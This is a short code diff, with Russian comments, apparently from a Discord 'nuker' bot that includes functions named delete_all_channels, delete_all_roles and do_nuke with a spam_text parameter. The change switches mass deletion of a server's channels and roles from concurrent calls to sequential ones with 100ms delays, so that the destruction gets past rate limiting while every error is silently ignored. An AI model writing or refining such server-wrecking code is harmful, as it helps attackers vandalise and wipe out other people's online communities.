@@ -289,16 +289,27 @@ async def delete_all_channels(guild):
         channels = list(guild.channels)
         if not channels:
             break
-        await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
+        # Удаляем каналы с задержкой, чтобы избежать rate limiting
+        for channel in channels:
+            try:
+                await channel.delete()
+                await asyncio.sleep(0.1)  # 100ms задержка между удалениями
+            except Exception:
+                pass
         await asyncio.sleep(1.5)
 
 
 async def delete_all_roles(guild):
     bot_role = guild.me.top_role
-    await asyncio.gather(
-        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
-        return_exceptions=True
-    )
+    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    
+    # Удаляем роли с задержкой, чтобы избежать rate limiting
+    for role in roles_to_delete:
+        try:
+            await role.delete()
+            await asyncio.sleep(0.1)  # 100ms задержка между удалениями
+        except Exception:
+            pass
 
 
 async def do_nuke(guild, spam_text=None, caller_id=None):
